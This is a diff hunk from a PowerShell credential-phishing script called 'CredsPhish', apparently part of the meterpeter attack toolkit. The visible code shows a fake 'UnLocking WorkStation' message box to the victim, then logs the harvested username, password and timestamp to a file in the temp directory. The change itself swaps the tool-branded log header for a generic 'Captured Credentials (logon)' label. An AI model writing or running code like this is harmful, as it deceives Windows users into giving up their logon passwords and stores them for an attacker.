@@ -52,8 +52,8 @@ while ($counter -lt '1000000000')
       $timestamp = Get-Date;
       $msgbox = [System.Windows.Forms.MessageBox]::Show("Authentication Successful, UnLocking WorkStation ..", "$Account", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Information)
       echo "" > $env:tmp\CredsPhish.log
-      echo "meterpeter - CredsPhish" >> $env:tmp\CredsPhish.log
-      echo "-----------------------" >> $env:tmp\CredsPhish.log
+      echo "Captured Credentials (logon)" >> $env:tmp\CredsPhish.log
+      echo "----------------------------" >> $env:tmp\CredsPhish.log
       echo "TimeStamp : $timestamp" >> $env:tmp\CredsPhish.log
       echo "username  : $user" >> $env:tmp\CredsPhish.log
       echo "password  : $pass" >> $env:tmp\CredsPhish.log
